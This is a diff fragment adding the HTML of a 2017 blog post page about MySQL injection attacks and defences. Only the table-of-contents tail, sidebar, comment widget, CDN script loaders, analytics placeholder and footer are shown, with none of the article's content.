href="#实战正则过滤绕过"><span class="toc-nav-number">11.</span> <span class="toc-nav-text">实战正则过滤绕过</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#防御手段代码以php为例"><span class="toc-nav-number">12.</span> <span class="toc-nav-text">防御手段(代码以PHP为例)</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#mysqli"><span class="toc-nav-number">12.1.</span> <span class="toc-nav-text">MYSQLi</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#odbc"><span class="toc-nav-number">12.2.</span> <span class="toc-nav-text">ODBC</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#pdo"><span class="toc-nav-number">12.3.</span> <span class="toc-nav-text">PDO</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#框架"><span class="toc-nav-number">12.4.</span> <span class="toc-nav-text">框架</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#参考"><span class="toc-nav-number">13.</span> <span class="toc-nav-text">参考</span></a></li></ol>
+        
+        </div>
+      </aside>
+    
+
+                
+            <!-- Sidebar Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#Web" title="Web">Web</a>
+                        
+                          <a class="tag" href="/tags/#SQL" title="SQL">SQL</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="http://beantech.org" target="_blank">Bean Tech</a></li>
+                    
+                        <li><a href="http://blog.kaijun.rocks" target="_blank">Kaijun&#39;s Blog</a></li>
+                    
+                        <li><a href="http://huangxuan.me" target="_blank">Hux Blog</a></li>
+                    
+                        <li><a href="#" target="_blank">It Helps SEO</a></li>
+                    
+                </ul>
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<!-- disqus embedded js code start (one page only need to embed once) -->
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES * * */
+    var disqus_shortname = "your-disqus-ID";
+    var disqus_identifier = "http://rootclay.github.io/2017/04/21/MySQL注入攻击与防御/";
+    var disqus_url = "http://rootclay.github.io/2017/04/21/MySQL注入攻击与防御/";
+
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<!-- disqus embedded js code start end -->
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'hover',
+          placement: 'left',
+          icon: 'ℬ'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+                    <li>
+                        <a target="_blank" href="https://www.zhihu.com/people/xiang-shan-74-8">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa  fa-stack-1x fa-inverse">知</i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+                    <li>
+                        <a target="_blank" href="http://weibo.com/u/5715481982">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-weibo fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/rootclay">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Rootclay 2017 
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("http://rootclay.github.io/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+<script>
+    // dynamic User by Hux
+    var _gaId = 'UA-XXXXXXXX-X';
+    var _gaDomain = 'yoursite';
+
+    // Originial
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', _gaId, _gaDomain);
+    ga('send', 'pageview');
+</script>
+
+
+
+
+<!-- Baidu Tongji -->
+
+
+
+
+
+
+	<a id="rocket" href="#top" class=""></a>
+	<script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+    <script type="text/javascript" src="/js/toc.js?v=1.0.0" async=""></script>
+<!-- Image to hack wechat -->
+<!-- <img src="http://rootclay.github.io/img/icon_wechat.png" width="0" height="0" /> -->
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
